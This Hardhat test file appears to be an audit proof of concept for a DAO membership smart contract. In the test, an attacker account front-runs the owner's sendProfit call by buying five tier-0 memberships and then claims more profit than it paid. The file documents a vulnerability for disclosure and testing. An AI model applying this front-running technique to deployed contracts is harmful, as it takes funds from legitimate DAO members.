import { toNumber } from "ethers";

const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("MembershipFactory", function () {
  let MembershipFactory,
    membershipFactory: any,
    MembershipERC1155: any,
    membershipERC1155: any,
    testERC20: any;
  let currencyManager: any,
    CurrencyManager,
    owner: any,
    addr1: any,
    addr2: any,
    addr3: any,
    addr4: any,
    addr5: any,
    attacker: any,
    addrs;
  let DAOType: any, DAOConfig: any, TierConfig: any;

  beforeEach(async function () {
    [owner, addr1, addr2, addr3, addr4, addr5, attacker, ...addrs] =
      await ethers.getSigners();

    CurrencyManager = await ethers.getContractFactory("CurrencyManager");
    currencyManager = await CurrencyManager.deploy();
    // await currencyManager.deployed();

    MembershipERC1155 = await ethers.getContractFactory("MembershipERC1155");
    const membershipImplementation = await MembershipERC1155.deploy();
    // await membershipImplementation.deployed();

    MembershipFactory = await ethers.getContractFactory("MembershipFactory");
    membershipFactory = await MembershipFactory.deploy(
      currencyManager.target,
      owner.address,
      "https://baseuri.com/",
      membershipImplementation.target
    );
    // await membershipFactory.deployed();

    const ERC20 = await ethers.getContractFactory("OWPERC20");
    testERC20 = await ERC20.deploy("OWP", "OWP");
    // await testERC20.deployed();
    // await currencyManager.addCurrency(testERC20.target);
    DAOType = { GENERAL: 0, PRIVATE: 1, SPONSORED: 2 };
    DAOConfig = {
      ensname: "testdao.eth",
      daoType: DAOType.SPONSORED,
      currency: testERC20.target,
      maxMembers: 100,
      noOfTiers: 7,
    };
    TierConfig = [
      { price: 300, amount: 10, minted: 0, power: 12 },
      { price: 200, amount: 10, minted: 0, power: 6 },
      { price: 100, amount: 10, minted: 0, power: 3 },
      { price: 300, amount: 10, minted: 0, power: 12 },
      { price: 200, amount: 10, minted: 0, power: 6 },
      { price: 100, amount: 10, minted: 0, power: 3 },
      { price: 100, amount: 10, minted: 0, power: 3 },
    ];
  });

  describe("POC attacker front run send profit, get more profit", function () {
    async function mintEnoughCurrencyWithApprove(
      user: any,
      approvedContract: any,
      amount: number
    ) {
      await testERC20.mint(user.address, amount);
      await testERC20.connect(user).approve(approvedContract.target, amount);
    }
    beforeEach(async function () {
      await currencyManager.addCurrency(testERC20.target); // Assume addCurrency function exists in CurrencyManager
      await membershipFactory.createNewDAOMembership(DAOConfig, TierConfig);
      const ensAddress = await membershipFactory.getENSAddress("testdao.eth");
      membershipERC1155 = await MembershipERC1155.attach(ensAddress);
    });

    it("POC attacker front-run send profit", async function () {
      const users = [addr1, addr2, addr3, addr4, addr5];
      const tierIndex = 0;
      for (let i = 0; i < users.length; i++) {
        // user1,user2,user3,user4,user5 joinDao paying 300wei
        await mintEnoughCurrencyWithApprove(users[i], membershipFactory, 300);
        await expect(
          membershipFactory
            .connect(users[i])
            .joinDAO(membershipERC1155.target, tierIndex)
        ).to.emit(membershipFactory, "UserJoinedDAO");
      }

      // attacker monitoring sendProfit tx, confirm the potenrial profit, then front-run the tx
      // attacker joinDao five times, get five nft(tierIndex=0)
      console.log("attacker pay", 300 * 5, " wei to joinDao five times");
      for (let i = 0; i < 5; i++) {
        await mintEnoughCurrencyWithApprove(attacker, membershipFactory, 300);
        await expect(
          membershipFactory
            .connect(attacker)
            .joinDAO(membershipERC1155.target, tierIndex)
        ).to.emit(membershipFactory, "UserJoinedDAO");
      }

      // daocreater
      await mintEnoughCurrencyWithApprove(owner, membershipERC1155, 4000);
      await membershipERC1155.connect(owner).sendProfit(4000);

      const attackerBalancebefore = await testERC20.balanceOf(attacker.address);
      // attacker claimProfit
      await membershipERC1155.connect(attacker).claimProfit();
      const attackerBalanceAfter = await testERC20.balanceOf(attacker.address);
      const profit = attackerBalanceAfter - attackerBalancebefore;
      console.log("attacker claimProfit", profit.toString());

      // cost 1500, proft > 1500
      expect(BigInt(profit) - BigInt(1500)).to.be.gt(0);
    });
  });
});
